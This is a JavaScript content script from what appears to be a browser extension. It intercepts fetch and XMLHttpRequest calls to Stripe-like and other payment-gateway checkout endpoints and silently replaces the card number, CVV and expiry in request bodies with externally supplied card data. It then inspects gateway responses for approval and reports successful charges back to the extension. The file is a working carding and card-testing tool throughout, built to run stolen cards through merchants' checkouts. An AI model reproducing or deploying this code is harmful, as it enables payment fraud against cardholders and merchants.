// Injected in the page context by content-scripts/main.js
// Generic CVC/CVV modifier for multiple payment gateways.

(function () {
  if (window.BINARY_MULTI_GATEWAY_LOADED) return;
  window.BINARY_MULTI_GATEWAY_LOADED = true;

  let currentCard = null; // { number, date, cvv }

  window.addEventListener("message", (ev) => {
    if (ev.source !== window || !ev.data) return;
    const msg = ev.data;
    if (msg.source === "content_script" && msg.type === "SET_CARD") {
      currentCard = {
        number: msg.number,
        date: msg.date,
        cvv: msg.cvv,
      };
    }
  });

  function parseExpiry(dateStr) {
    if (!dateStr || typeof dateStr !== "string") return { mm: "01", yyyy: "2099" };
    const parts = dateStr.split("/");
    if (parts.length < 2) return { mm: "01", yyyy: "2099" };
    const mm = (parts[0] || "01").padStart(2, "0");
    const yy = parts[1].slice(-2);
    const yyyy = "20" + yy;
    return { mm, yyyy };
  }

  function patchUrlEncoded(body) {
    if (!currentCard || typeof body !== "string") return body;
    const { number, cvv, date } = currentCard;
    const { mm, yyyy } = parseExpiry(date);

    let out = body;

    const replacePairs = [
      ["number=", number],
      ["card[number]=", number],
      ["card%5Bnumber%5D=", number],
      ["cvc=", cvv],
      ["cvv=", cvv],
      ["security_code=", cvv],
      ["card[cvc]=", cvv],
      ["card%5Bcvc%5D=", cvv],
      ["exp_month=", mm],
      ["expiration_month=", mm],
      ["expYear=", yyyy],
      ["exp_year=", yyyy],
      ["expiration_year=", yyyy],
    ];

    for (const [key, val] of replacePairs) {
      const re = new RegExp("(" + key.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + ")[^&]*");
      out = out.replace(re, `$1${encodeURIComponent(val)}`);
    }

    return out;
  }

  function patchJsonBody(obj) {
    if (!currentCard || !obj || typeof obj !== "object") return obj;
    const { number, cvv, date } = currentCard;
    const { mm, yyyy } = parseExpiry(date);

    function walk(node) {
      if (!node || typeof node !== "object") return;
      for (const key of Object.keys(node)) {
        const val = node[key];
        if (val && typeof val === "object") {
          walk(val);
        }
        const k = key.toLowerCase();
        if (k === "number" || k === "cardnumber") {
          node[key] = number;
        }
        if (k === "cvc" || k === "cvv" || k === "security_code") {
          node[key] = cvv;
        }
        if (k === "exp_month" || k === "expiration_month" || k === "cardexpmonth") {
          node[key] = mm;
        }
        if (k === "exp_year" || k === "expiration_year" || k === "cardexpyear") {
          node[key] = yyyy;
        }
      }
    }

    walk(obj);
    return obj;
  }

  function shouldPatchUrl(url) {
    if (!url || typeof url !== "string") return false;
    const u = url.toLowerCase();
    // Stripe-like
    if (u.includes("/v1/payment_methods") || u.includes("/v1/sources")) return true;
    // Generic patterns across gateways
    if (u.includes("/payments") || u.includes("/payment_methods")) return true;
    if (u.includes("/checkout") && (u.includes("card") || u.includes("payment"))) return true;
    return false;
  }

  function detectSuccess(json) {
    if (!json || typeof json !== "object") return null;
    try {
      const status = (json.status || json.state || json.result || "").toString().toLowerCase();
      if (["succeeded", "success", "approved", "paid", "completed"].includes(status)) {
        return { type: "success", message: "Payment success" };
      }
      if (json.paymentIntent && detectSuccess(json.paymentIntent)) {
        return { type: "success", message: "Payment intent success" };
      }
      if (json.order && detectSuccess(json.order)) {
        return { type: "success", message: "Order success" };
      }
    } catch (_) {}
    return null;
  }

  function emitGatewaySuccess(info) {
    try {
      window.postMessage(
        {
          __gateway_helper: true,
          type: "success",
          message: info && info.message ? info.message : "Payment success",
        },
        "*",
      );
    } catch (_) {}
  }

  const origFetch = window.fetch;
  window.fetch = function patchedFetch(input, init) {
    let url;
    try {
      url = typeof input === "string" ? input : input && input.url;
      if (shouldPatchUrl(url) && currentCard && init && typeof init.body === "string") {
        const bodyStr = init.body.trim();
        if (bodyStr.startsWith("{") || bodyStr.startsWith("[")) {
          try {
            const parsed = JSON.parse(bodyStr);
            patchJsonBody(parsed);
            init.body = JSON.stringify(parsed);
          } catch (_) {
            init.body = patchUrlEncoded(init.body);
          }
        } else {
          init.body = patchUrlEncoded(init.body);
        }
      }
    } catch (_) {}

    return origFetch.apply(this, arguments).then((resp) => {
      try {
        if (resp && shouldPatchUrl(url)) {
          resp
            .clone()
            .json()
            .then((json) => {
              const info = detectSuccess(json);
              if (info) emitGatewaySuccess(info);
            })
            .catch(() => {});
        }
      } catch (_) {}
      return resp;
    });
  };

  const origXHROpen = XMLHttpRequest.prototype.open;
  const origXHRSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function (method, url) {
    this.__binaryUrl = url;
    return origXHROpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function (body) {
    try {
      if (shouldPatchUrl(this.__binaryUrl) && currentCard && typeof body === "string") {
        const trimmed = body.trim();
        if (trimmed.startsWith("{") || trimmed.startsWith("[")) {
          try {
            const parsed = JSON.parse(trimmed);
            patchJsonBody(parsed);
            body = JSON.stringify(parsed);
          } catch (_) {
            body = patchUrlEncoded(body);
          }
        } else {
          body = patchUrlEncoded(body);
        }
        arguments[0] = body;
      }
    } catch (_) {}

    this.addEventListener("load", function () {
      try {
        if (!shouldPatchUrl(this.__binaryUrl)) return;
        const text = this.responseText;
        if (!text) return;
        const json = JSON.parse(text);
        const info = detectSuccess(json);
        if (info) emitGatewaySuccess(info);
      } catch (_) {}
    });

    return origXHRSend.apply(this, arguments);
  };
})();

